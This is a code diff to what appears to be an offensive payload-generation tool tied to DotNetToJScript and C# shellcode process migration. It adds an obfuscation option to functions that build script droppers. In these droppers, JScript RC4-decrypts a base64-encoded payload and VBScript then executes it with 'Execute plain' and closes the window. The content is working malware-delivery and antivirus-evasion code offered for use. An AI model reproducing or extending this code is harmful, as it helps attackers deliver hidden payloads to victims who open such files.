@@ -2,6 +2,7 @@
     Generators various code snippets, primarily used for DotNetToJScript.
 """
 from Tools.Bypass.bypass_common import bypass_helpers  # pylint: disable=E0611,E0401
+from Tools.Bypass.bypass_common import obfuscator # pylint: disable=E0611,E0401
 import os
 
 def genCSharpShellCodeMigration(process, gamemaker_code):
@@ -206,7 +207,7 @@ def genCSharpShellCodeMigration(process, gamemaker_code):
 
     return code
 
-def genRC4JScript(payload, key):
+def genRC4JScript(payload, key, obfuscate):
 	# TODO: obfuscate
 	code = "<script language = \"javascript\">"
 
@@ -244,6 +245,9 @@ decodeBase64 = function(s) {
     }
     return r;
 };"""
+
+	if obfuscate:
+		code = obfuscator.jsObfuscate(code)
 
 	code += '\nvar b64block = "{0}";'.format(payload)
 	code += "\nvar decoded = decodeBase64(b64block);"
@@ -254,10 +258,10 @@ decodeBase64 = function(s) {
 	return code
 
 
-def genRC4VBScript(payload, key):
+def genRC4VBScript(payload, key, obfuscate):
 
 	# TODO: obfuscate
-	code = "<script language = \"javascript\">"
+	code = ""
 
 	code += """rc4 = function(key, str) {
 	var s = [], j = 0, x, res = '';
@@ -297,10 +301,16 @@ decodeBase64 = function(s) {
 	code += '\nvar b64block = "{0}";'.format(payload)
 	code += "\nvar decoded = decodeBase64(b64block);"
 	code += "\nvar plain = rc4(\"{0}\", decoded);".format(key)
+
+	if obfuscate:
+		code = obfuscator.jsObfuscate(code)
+
 	code += "\n</script>"
 	code += "\n<script language = \"vbscript\">"
 	code += "\nExecute plain"
 	code += "\nself.close"
 	code += "</script>"
+
+	code = "<script language = \"javascript\">\n" + code
 
 	return code
